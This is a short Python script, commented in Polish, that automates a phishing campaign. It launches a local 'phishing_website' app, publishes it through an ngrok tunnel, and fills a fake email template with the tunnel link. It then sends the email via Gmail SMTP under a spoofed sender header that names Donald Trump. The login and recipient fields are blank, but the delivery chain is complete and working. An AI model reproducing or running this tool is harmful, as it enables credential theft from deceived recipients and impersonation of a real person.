from pyngrok import ngrok
import json
import subprocess
import time

#odpalenie serwera 
cmd_line = "python3 ./phishing_website/app.py"
subprocess.Popen(cmd_line, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
https_tunnel = ngrok.connect(5000, bind_tls=True)
print(https_tunnel.public_url)

# obsluga jsona z mailami
fake_mail_text = []
with open('fake_mail.json') as f:
    data = json.load(f)
    for tex in data['fake_mail']:
        fake_mail_text.append(tex['text'])
phishing_link = https_tunnel.public_url
print(fake_mail_text[1].replace('{phishing_link}', phishing_link))

#wysłanie maila, szybkie sprawdzenie czy działa tak jak chciałem
import smtplib
fake_from = "donaldtrump@gmail.com"
fake_name = "Donald Trump"
subject = "ASAP"
content = fake_mail_text[1].replace('{phishing_link}', phishing_link)
to_name = ''
to_email = ''
with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
    smtp.ehlo()
    smtp.starttls()
    smtp.ehlo()

    smtp.login('', '')


   # subject = 'aaaaa'
   # body = 'aaaaa'
    message = f"From: {fake_name} <{fake_from}>\nTo: {to_name} <{to_email}>\nSubject: {subject}\n\n{content}"


   # msg = f'Subject: {subject}\n\n{body}'
    smtp.sendmail('', '', message.encode())



time.sleep(1000)
